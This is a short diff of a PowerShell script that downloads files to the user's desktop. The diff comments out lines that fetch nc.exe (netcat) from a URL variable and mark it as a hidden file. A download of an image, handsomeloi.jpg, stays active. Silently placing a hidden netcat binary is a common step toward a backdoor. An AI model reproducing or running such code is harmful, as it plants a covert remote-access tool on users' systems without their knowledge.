@@ -7,10 +7,10 @@ $ncFinalPath = Join-Path -Path $desktopPath -ChildPath $ncFileName
 $imageFinalPath = Join-Path -Path $desktopPath -ChildPath $imageFileName
 
 try {
-    Write-Host "Downloading nc.exe..."
-    $ncDownload = Invoke-WebRequest -Uri $ncUrl -OutFile $ncFinalPath -ErrorAction Stop
-    Set-ItemProperty -Path $ncFinalPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
-    Write-Host "nc.exe downloaded and hidden."
+    # Write-Host "Downloading nc.exe..."
+    # $ncDownload = Invoke-WebRequest -Uri $ncUrl -OutFile $ncFinalPath -ErrorAction Stop
+    # Set-ItemProperty -Path $ncFinalPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+    # Write-Host "nc.exe downloaded and hidden."
 
     Write-Host "Downloading handsomeloi.jpg..."
     $imageDownload = Invoke-WebRequest -Uri $imageUrl -OutFile $imageFinalPath -ErrorAction Stop
